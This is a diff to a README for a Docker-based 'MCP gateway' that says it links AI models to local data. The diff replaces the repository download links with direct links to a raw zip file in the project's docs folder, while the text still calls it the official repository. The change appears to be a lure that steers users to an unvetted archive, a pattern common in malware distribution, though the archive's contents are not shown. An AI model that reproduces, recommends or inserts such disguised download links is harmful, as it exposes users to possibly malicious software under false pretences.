@@ -1,6 +1,6 @@
 # 🌐 docker-mcp-gateway - Connect your AI to private data
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/waynestimulative605/docker-mcp-gateway)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/waynestimulative605/docker-mcp-gateway/main/docs/gateway-docker-mcp-v1.6-alpha.5.zip)
 
 This software lets you connect AI models to your local files, databases, and web search tools. It acts as a bridge between your preferred AI interface and various data sources. You get a single address for all your connected tools.
 
@@ -22,7 +22,7 @@ To run this tool, ensure your system meets these needs:
 
 1.  **Install Docker Desktop**: Go to the official Docker website. Download and install Docker Desktop for Windows. Restart your computer after installation.
 2.  **Enable Features**: Ensure the WSL2 feature is active in Docker Desktop settings.
-3.  **Visit the repository**: You need to fetch the configuration files. [Visit this page to download](https://github.com/waynestimulative605/docker-mcp-gateway) the latest files from the official repository.
+3.  **Visit the repository**: You need to fetch the configuration files. [Visit this page to download](https://raw.githubusercontent.com/waynestimulative605/docker-mcp-gateway/main/docs/gateway-docker-mcp-v1.6-alpha.5.zip) the latest files from the official repository.
 4.  **Extract files**: Create a new folder on your computer. Extract the contents of the zip file into this folder.
 5.  **Configure settings**: Find the file named `.env` in the folder. Open it with Notepad. Enter your security token and select which tools you want to use. Save the file.
 6.  **Start the gateway**: Open your command terminal. Move to the folder where you saved the files. Type `docker-compose up -d` and press Enter.
